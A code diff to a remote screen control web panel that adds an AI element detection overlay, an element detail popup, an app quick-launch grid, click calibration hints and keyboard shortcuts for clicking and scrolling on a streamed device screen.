+                labelDiv.style.borderColor = elementInfo.borderColor;
+                labelDiv.style.color = elementInfo.borderColor;
+                
+                const iconDiv = document.createElement('div');
+                iconDiv.className = 'ai-element-icon';
+                iconDiv.style.background = elementInfo.bgColor;
+                iconDiv.textContent = elementInfo.emoji || elementInfo.text;
+                
+                const textSpan = document.createElement('span');
+                const displayText = element.text ? element.text.substring(0, 10) : elementType.replace('app_', '').replace('folder_', '').replace('ui_', '');
+                textSpan.textContent = displayText.length > 8 ? displayText.substring(0, 8) + '...' : displayText;
+                
+                labelDiv.appendChild(iconDiv);
+                labelDiv.appendChild(textSpan);
+                elementDiv.appendChild(labelDiv);
+                
+                // Add click handler for element details
+                elementDiv.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    showElementDetails(element);
+                });
+                
+                UIElements.aiHighlightOverlay.appendChild(elementDiv);
+                
+                // Count statistics
+                if (elementType.startsWith('app_')) appCount++;
+                else if (elementType.startsWith('folder_')) folderCount++;
+                else if (elementType.startsWith('ui_')) uiCount++;
+                else if (elementType === 'button' || elementType === 'input' || elementType === 'checkbox') uiCount++;
+            });
+            
+            // Update AI stats
+            const totalElements = detectedElements.length;
+            UIElements.aiStats.innerHTML = `
+                🤖 AI Detection<br>
+                Apps: ${appCount} | Folders: ${folderCount}<br>
+                UI Elements: ${uiCount} | Total: ${totalElements}
+            `;
+            UIElements.aiStats.style.display = 'block';
+            
+            console.log(`🤖 Rendered ${totalElements} AI elements (${appCount} apps, ${folderCount} folders, ${uiCount} UI)`);
+        }
+
+        function showElementDetails(element) {
+            const elementInfo = appColorDatabase[element.type] || appColorDatabase['text'];
+            
+            UIElements.elementDetailPanel.innerHTML = `
+                <div class="element-detail-header">
+                    <span style="background: ${elementInfo.bgColor}; padding: 3px 8px; border-radius: 5px; color: white;">
+                        ${elementInfo.emoji || elementInfo.text}
+                    </span>
+                    ${elementInfo.name || element.type}
+                </div>
+                <div class="element-detail-content">
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Type:</span>
+                        <span class="element-detail-value"> ${element.type}</span>
+                    </div>
+                    ${element.text ? `
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Text:</span>
+                        <span class="element-detail-value"> ${element.text}</span>
+                    </div>` : ''}
+                    ${element.desc ? `
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Description:</span>
+                        <span class="element-detail-value"> ${element.desc}</span>
+                    </div>` : ''}
+                    ${element.class ? `
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Class:</span>
+                        <span class="element-detail-value"> ${element.class}</span>
+                    </div>` : ''}
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Position:</span>
+                        <span class="element-detail-value"> ${element.x}, ${element.y}</span>
+                    </div>
+                    <div class="element-detail-item">
+                        <span class="element-detail-label">Size:</span>
+                        <span class="element-detail-value"> ${element.width} × ${element.height}</span>
+                    </div>
+                    <div class="element-detail-item">
+                        <button onclick="clickElementAt(${element.x + element.width/2}, ${element.y + element.height/2})" 
+                                style="background: ${elementInfo.bgColor}; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; width: 100%;">
+                            🎯 Click This Element
+                        </button>
+                    </div>
+                </div>
+            `;
+            UIElements.elementDetailPanel.style.display = 'block';
+            
+            // Auto-hide after 10 seconds
+            setTimeout(() => {
+                UIElements.elementDetailPanel.style.display = 'none';
+            }, 10000);
+        }
+
+        function clickElementAt(x, y) {
+            sendClickCommand(x, y, 'ai-element-click');
+            showClickFeedback(
+                (x * state.currentScale.x) + state.currentOffset.x,
+                (y * state.currentScale.y) + state.currentOffset.y,
+                x, y
+            );
+        }
+
+        function toggleAIMode() {
+            state.aiDetectionMode = !state.aiDetectionMode;
+            UIElements.aiModeBtn.textContent = state.aiDetectionMode ? '🤖 AI DETECTION ON' : '🤖 AI DETECTION OFF';
+            UIElements.aiModeBtn.classList.toggle('active', state.aiDetectionMode);
+            
+            if (!state.aiDetectionMode) {
+                UIElements.aiHighlightOverlay.innerHTML = '';
+                UIElements.aiStats.style.display = 'none';
+                UIElements.elementDetailPanel.style.display = 'none';
+            } else if (state.detectedElements.length > 0) {
+                renderAIElements(state.detectedElements);
+            }
+            
+            console.log(`🤖 AI Detection ${state.aiDetectionMode ? 'enabled' : 'disabled'}`);
+        }
+
+        function showAppGrid() {
+            // Collect unique apps from detected elements
+            const apps = new Map();
+            state.detectedElements.forEach(element => {
+                if (element.type && element.type.startsWith('app_')) {
+                    const appType = element.type;
+                    if (!apps.has(appType)) {
+                        const appInfo = appColorDatabase[appType];
+                        if (appInfo) {
+                            apps.set(appType, {
+                                ...appInfo,
+                                element: element
+                            });
+                        }
+                    }
+                }
+            });
+            
+            UIElements.appGrid.innerHTML = '<div class="app-grid-header">Quick Actions</div>';
+            
+            if (apps.size === 0) {
+                const noAppsDiv = document.createElement('div');
+                noAppsDiv.style.gridColumn = '1 / -1';
+                noAppsDiv.style.textAlign = 'center';
+                noAppsDiv.style.padding = '20px';
+                noAppsDiv.style.color = '#aaa';
+                noAppsDiv.textContent = 'No apps detected yet';
+                UIElements.appGrid.appendChild(noAppsDiv);
+            } else {
+                apps.forEach((appInfo, appType) => {
+                    const appDiv = document.createElement('div');
+                    appDiv.className = 'app-icon';
+                    appDiv.style.background = appInfo.bgColor;
+                    appDiv.textContent = appInfo.emoji;
+                    appDiv.title = appInfo.name;
+                    
+                    const labelDiv = document.createElement('div');
+                    labelDiv.className = 'app-icon-label';
+                    labelDiv.textContent = appInfo.name.substring(0, 8);
+                    
+                    appDiv.appendChild(labelDiv);
+                    
+                    appDiv.addEventListener('click', () => {
+                        if (appInfo.element) {
+                            const x = appInfo.element.x + appInfo.element.width / 2;
+                            const y = appInfo.element.y + appInfo.element.height / 2;
+                            clickElementAt(x, y);
+                            UIElements.appGrid.style.display = 'none';
+                        }
+                    });
+                    
+                    UIElements.appGrid.appendChild(appDiv);
+                });
+            }
+            
+            UIElements.appGrid.style.display = 'grid';
+        }
+
         function calibrateClick() {
             // Reset calibration
             state.calibrationOffset = { x: 0, y: 0 };
             
-            // Show test area
-            UIElements.testClickArea.style.display = 'block';
-            
             UIElements.debugInfo.innerHTML = `
                 🎯 Calibration Mode Active<br>
-                Click the test buttons or screen<br>
-                Right-click to adjust offset
+                Click anywhere to test<br>
+                Right-click to adjust (+10 each)<br>
+                Shift+Right-click: -10 X<br>
+                Ctrl+Right-click: -10 Y<br>
+                Current: ${state.calibrationOffset.x}, ${state.calibrationOffset.y}
             `;
             UIElements.debugInfo.style.display = 'block';
             
@@ -781,6 +1649,7 @@
             
             console.log('🚀 Starting live stream');
             state.isLiveStreaming = true;
+            UIElements.loadingSpinner.style.display = 'block';
             
             sendCommand('start_live_stream');
             
@@ -791,6 +1660,7 @@
             // Setup click handler when image loads
             UIElements.liveScreenImage.onload = function() {
                 console.log('🖼️ Image loaded, click handler ready');
+                UIElements.loadingSpinner.style.display = 'none';
             };
             
             clearTimeout(state.retryTimeout);
@@ -807,6 +1677,7 @@
             UIElements.liveIndicator.classList.remove('active');
             UIElements.streamStatus.textContent = 'Stream: OFF';
             UIElements.streamStatus.style.color = '#ff4444';
+            UIElements.loadingSpinner.style.display = 'none';
             
             clearTimeout(state.retryTimeout);
         }
@@ -838,7 +1709,7 @@
                         
                         showView('control-view');
                         
-                        // Auto-start live stream
+                        // Auto-start live stream after 1 second
                         setTimeout(() => {
                             startLiveStream();
                             setupClickHandler();
@@ -887,7 +1758,9 @@
                 state.activeDeviceId = null;
                 UIElements.coordsDisplay.style.display = 'none';
                 UIElements.debugInfo.style.display = 'none';
-                UIElements.testClickArea.style.display = 'none';
+                UIElements.aiStats.style.display = 'none';
+                UIElements.elementDetailPanel.style.display = 'none';
+                UIElements.appGrid.style.display = 'none';
             }
         }
 
@@ -994,12 +1867,6 @@
             if (data.screenWidth && data.screenHeight) {
                 state.screenDimensions.width = data.screenWidth;
                 state.screenDimensions.height = data.screenHeight;
-                
-                // Calculate scale factor for display
-                const img = UIElements.liveScreenImage;
-                if (img.naturalWidth > 0) {
-                    state.scaleFactor = data.screenWidth / img.naturalWidth;
-                }
             }
             
             // Update screen image
@@ -1016,6 +1883,16 @@
                 setupClickHandler();
                 state.clickHandlerSetup = true;
             }
+            
+            // Process AI detected elements
+            if (data.detectedElements && state.aiDetectionMode) {
+                renderAIElements(data.detectedElements);
+            } else if (state.aiDetectionMode) {
+                UIElements.aiStats.innerHTML = '🤖 No AI data received';
+                UIElements.aiStats.style.display = 'block';
+            }
+            
+            UIElements.loadingSpinner.style.display = 'none';
         });
 
         // UI EVENT LISTENERS
@@ -1032,11 +1909,15 @@
             }
         };
 
-        UIElements.testClickBtn.onclick = () => {
-            calibrateClick();
+        UIElements.aiModeBtn.onclick = toggleAIMode;
+        UIElements.appGridBtn.onclick = showAppGrid;
+        UIElements.calibrateBtn.onclick = calibrateClick;
+        UIElements.refreshAIBtn.onclick = () => {
+            if (state.currentImageData && state.currentImageData.detectedElements) {
+                renderAIElements(state.currentImageData.detectedElements);
+                console.log('🔍 Refreshed AI elements');
+            }
         };
-
-        UIElements.calibrateClickBtn.onclick = calibrateClick;
 
         // CONTROL BUTTONS
         document.getElementById('btn-start-stream').onclick = startLiveStream;
@@ -1049,6 +1930,38 @@
         document.getElementById('btn-scroll-down').onclick = () => sendCommand('scroll_action', { direction: 'down' });
         document.getElementById('btn-scroll-left').onclick = () => sendCommand('scroll_action', { direction: 'left' });
         document.getElementById('btn-scroll-right').onclick = () => sendCommand('scroll_action', { direction: 'right' });
+
+        // KEYBOARD SHORTCUTS
+        document.addEventListener('keydown', (e) => {
+            if (!state.isLiveStreaming) return;
+            
+            switch(e.key) {
+                case 'a':
+                case 'A':
+                    if (e.ctrlKey) toggleAIMode();
+                    break;
+                case 'c':
+                case 'C':
+                    if (e.ctrlKey) calibrateClick();
+                    break;
+                case 'g':
+                case 'G':
+                    if (e.ctrlKey) showAppGrid();
+                    break;
+                case 'Escape':
+                    UIElements.appGrid.style.display = 'none';
+                    UIElements.elementDetailPanel.style.display = 'none';
+                    UIElements.debugInfo.style.display = 'none';
+                    break;
+                case 'd':
+                case 'D':
+                    if (e.ctrlKey) {
+                        state.debugMode = !state.debugMode;
+                        console.log(`🐛 Debug mode ${state.debugMode ? 'enabled' : 'disabled'}`);
+                    }
+                    break;
+            }
+        });
 
         // PERIODIC UPDATES
         setInterval(() => {
@@ -1064,13 +1977,17 @@
         }, 1000);
 
         // INITIALIZE
-        console.log('🚀 Screen Control Panel Initialized');
+        console.log('🚀 AI Enhanced Screen Control Panel Initialized');
         UIElements.connectionStatusText.textContent = 'Connecting to server...';
 
         // Auto-connect
         if (!socket.connected) {
             socket.connect();
         }
+
+        // Make functions globally available
+        window.clickElementAt = clickElementAt;
+        window.toggleAIMode = toggleAIMode;
 
     </script>
 </body>
